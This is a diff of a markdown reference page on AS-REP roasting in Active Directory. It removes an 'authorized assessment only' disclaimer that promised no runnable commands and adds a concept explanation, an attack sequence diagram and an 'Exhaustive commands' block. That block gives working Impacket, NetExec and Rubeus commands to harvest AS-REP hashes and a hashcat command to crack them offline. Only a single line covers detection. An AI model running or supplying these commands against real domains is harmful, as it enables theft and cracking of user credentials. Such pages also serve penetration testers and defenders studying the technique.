@@ -10,16 +10,42 @@ mitre: "T1558.004"
 tag: null
 ---
 
+
 # AS-REP roasting
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **User object** with **`DONT_REQUIRE_PREAUTH`** (`userAccountControl` bit `0x400000`).
 
-## Detection
+### Concept (deep)
+Accounts without pre-authentication return an **AS-REP** encrypted with the user’s key **without prior authentication**. The attacker extracts the encrypted blob and cracks it offline.
+
+### Attack flow (Mermaid)
+```mermaid
+sequenceDiagram
+    participant A as Unauthenticated attacker
+    participant KDC
+    A->>KDC: AS-REQ (no preauth) for user
+    KDC-->>A: AS-REP encrypted with user key
+    A->>A: hashcat -m 18200
+```
+
+### Exhaustive commands
+```bash
+# ── Impacket ─────────────────────────────────────────────────────────
+impacket-GetNPUsers corp.local/ -usersfile users.txt \
+  -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.txt
+
+# ── NetExec ──────────────────────────────────────────────────────────
+nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' --asreproast asrep.txt
+
+# ── Rubeus (Windows) ─────────────────────────────────────────────────
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# ── Crack ────────────────────────────────────────────────────────────
+hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+### Detection
 **4768 `PreAuthType=0`** for accounts that normally require preauth.
 
 ---
